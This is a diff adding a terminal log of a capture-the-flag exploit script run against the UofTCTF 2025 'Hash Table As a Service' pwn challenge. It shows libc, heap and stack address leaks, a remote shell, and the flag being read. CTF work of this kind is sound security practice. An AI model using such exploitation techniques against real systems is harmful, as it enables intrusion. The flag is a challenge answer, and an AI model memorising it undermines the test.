@@ -1,0 +1,21 @@
+mito@mito-virtual-machine:~/CTF/UofTCTF_2025/Pwn_Hash_Table_As_a_Service$ python3 solve.py r
+[+] Opening connection to 34.162.33.160 on port 5000: Done
+/home/mito/CTF/UofTCTF_2025/Pwn_Hash_Table_As_a_Service/solve.py:59: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.recvuntil("Value: ")
+libc_leak = 0x7f336aee1b20
+libc_base = 0x7f336acde000
+/home/mito/CTF/UofTCTF_2025/Pwn_Hash_Table_As_a_Service/solve.py:82: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.recvuntil("Value: ")
+heap_leak = 0x56f7b2c5b
+/home/mito/CTF/UofTCTF_2025/Pwn_Hash_Table_As_a_Service/solve.py:117: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.recvuntil("Value: ")
+stack_leak = 0x7fffee2c9f68
+[*] Switching to interactive mode
+$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+$ ls -l
+total 24
+-rwxr-xr-x 1 nobody nogroup 16672 Jan 10 14:20 chall
+-rw-r--r-- 1 nobody nogroup    42 Jan 10 14:20 flag.txt
+$ cat flag.txt
+uoftctf{7hx_df53c_f0r_5p0n50r1n6_7h15_c7f}[
